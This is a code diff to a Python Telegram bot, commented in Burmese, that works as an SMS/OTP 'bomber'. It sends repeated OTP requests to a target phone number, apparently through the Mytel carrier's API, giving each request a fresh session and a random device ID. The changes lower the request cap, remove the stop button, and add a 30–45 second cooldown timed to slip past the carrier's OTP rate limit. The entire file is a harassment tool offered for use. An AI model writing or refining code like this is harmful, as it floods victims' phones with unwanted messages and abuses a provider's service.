@@ -43,20 +43,16 @@ def start_bombing(message):
         bot.reply_to(message, "❌ အကြိမ်ရေသည် ဂဏန်းဖြစ်ရပါမည်။")
         return
 
-    if count > 50:
-        bot.reply_to(message, "⚠️ ဆာဗာ ဝန်ပိမှုမရှိစေရန် တစ်ကြိမ်လျှင် အများဆုံး ၅၀ အထိသာ ခွင့်ပြုထားပါသည်။")
-        count = 50
+    if count > 30:
+        bot.reply_to(message, "⚠️ ဆာဗာ Cooldown ကန့်သတ်ချက်ကြောင့် အကြိမ်ရေကို အများဆုံး ၃၀ သို့ သတ်မှတ်ထားပါသည်။")
+        count = 30
 
-    markup = types.InlineKeyboardMarkup()
-    btn_stop = types.InlineKeyboardButton("🛑 ရပ်တန့်မည်", callback_data=f"stop_{message.chat.id}")
-    markup.add(btn_stop)
+    msg = bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 အကြိမ်ရေ: `{count}` ကြိမ်\n⏳ Time Limit / Cooldown စနစ်ဖြင့် လုပ်ဆောင်နေပါသည်...", parse_mode="Markdown")
 
-    bot.reply_to(message, f"🚀 စတင်နေပါပြီ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 အကြိမ်ရေ: `{count}` ကြိမ်", parse_mode="Markdown", reply_markup=markup)
+    # Thread စတင်ပြီး နောက်ကွယ်မှာ Time Limit နဲ့ အသစ်တောင်းစေခြင်း
+    threading.Thread(target=run_bomber, args=(message.chat.id, msg.message_id, phone_number, count)).start()
 
-    # Thread စတင်ပြီး နောက်ကွယ်မှာ အသစ်တောင်းသလို Auto ဆက်တိုက် လုပ်ဆောင်စေခြင်း
-    threading.Thread(target=run_bomber, args=(message.chat.id, phone_number, count)).start()
-
-def run_bomber(chat_id, phone_number, count):
+def run_bomber(chat_id, msg_id, phone_number, count):
     success_count = 0
     fail_count = 0
 
@@ -70,10 +66,7 @@ def run_bomber(chat_id, phone_number, count):
 
     for i in range(count):
         try:
-            # တခါတောင်းတိုင်းမှာ Session အသစ် (Fresh Request) တစ်ခုဖြစ်အောင် 
-            # ပြီးတော့ ပထမဆုံးအကြိမ် တောင်းသလိုမျိုး သီးသန့် Session Connection အသုံးပြုခြင်း
             session = requests.Session()
-            
             device_id = str(uuid.uuid4())
             
             headers = {
@@ -91,7 +84,6 @@ def run_bomber(chat_id, phone_number, count):
                 "uuid": device_id
             }
             
-            # Request အသစ်စက်စက် ပို့ဆောင်ခြင်း
             response = session.post(url, json=payload, headers=headers, timeout=10)
             
             if response.status_code == 200:
@@ -101,9 +93,22 @@ def run_bomber(chat_id, phone_number, count):
                 
         except Exception as e:
             fail_count += 1
-        
-        # တစ်ကြိမ်နဲ့တစ်ကြိမ် ကြားထဲမှာ ချက်ချင်းကြီး မသွားဘဲ သဘာဝကျကျ အနည်းငယ် စောင့်ပေးခြင်း
-        time.sleep(random.uniform(2.0, 4.0))
+
+        # အကယ်၍ နောက်ဆုံးတစ်ကြိမ် မရောက်သေးရင် Time Limit (Cooldown) စောင့်ဆိုင်းချိန် ထည့်ပေးခြင်း 
+        # (ဥပမာ- Mytel ဆာဗာ OTP ပို့ပြီးရင် နောက်တစ်ခါထပ်တောင်းလို့ရအောင် စက္ကန့် ၃၀ မှ ၄၅ စက္ကန့်အထိ အချိန်ခြားပေးခြင်း)
+        if i < count - 1:
+            cooldown_time = random.randint(30, 45) # လိုအပ်ပါက ဒီနေရာမှာ အချိန်ကို လျှော့နိုင် ချဲ့နိုင်ပါတယ်
+            try:
+                bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=msg_id,
+                    text=f"🚀 လုပ်ဆောင်နေဆဲ...\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n🔄 ပြီးမြောက်မှု: `{i+1}/{count}` ကြိမ်\n⏳ Time Limit Cooldown: `{cooldown_time} စက္ကန့်` စောင့်ဆိုင်းနေသည်...",
+                    parse_mode="Markdown"
+                )
+            except:
+                pass
+            
+            time.sleep(cooldown_time)
 
     bot.send_message(chat_id, f"✅ **Bomber ပြီးဆုံးပါပြီ!**\n\n📱 ဖုန်းနံပါတ်: `{phone_number}`\n✨ အောင်မြင်မှု: `{success_count}` ကြိမ်\n❌ မှားယွင်းမှု: `{fail_count}` ကြိမ်", parse_mode="Markdown")
 
